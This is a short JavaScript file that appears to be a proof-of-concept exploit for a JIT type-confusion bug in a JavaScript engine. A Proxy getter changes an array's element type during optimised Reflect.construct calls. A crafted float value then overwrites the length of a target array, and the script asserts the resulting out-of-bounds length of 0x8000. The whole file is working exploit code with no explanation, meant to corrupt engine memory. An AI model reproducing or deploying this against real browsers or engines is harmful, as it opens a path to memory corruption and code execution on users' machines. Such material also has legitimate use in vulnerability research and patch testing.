function f(p) {
	a.push(Reflect.construct(function(){}, arguments, p)?4.183559238858528e-216:0); //itof(0x1337133700010000)
}

let p = new Proxy(Object, {
    get: () => {
    	a[0] = {};
    	oob_arr = Array(1);
    	oob_arr[0] = 1.1;
    	return Object.prototype;
    }
});

function main(p) { return f(p); } // Wrapper function

let a = Array(11);
a[0] = 1.1;
console.log(a)
let oob_arr;  // Target array to overwrite length

a.pop();
a.pop();

// Trigger optimisation
for (let i = 0; i < 0x10000; i++) { main(function(){}); a.pop(); } 

main(function(){});
main(p);
console.assert(oob_arr.length === 0x8000);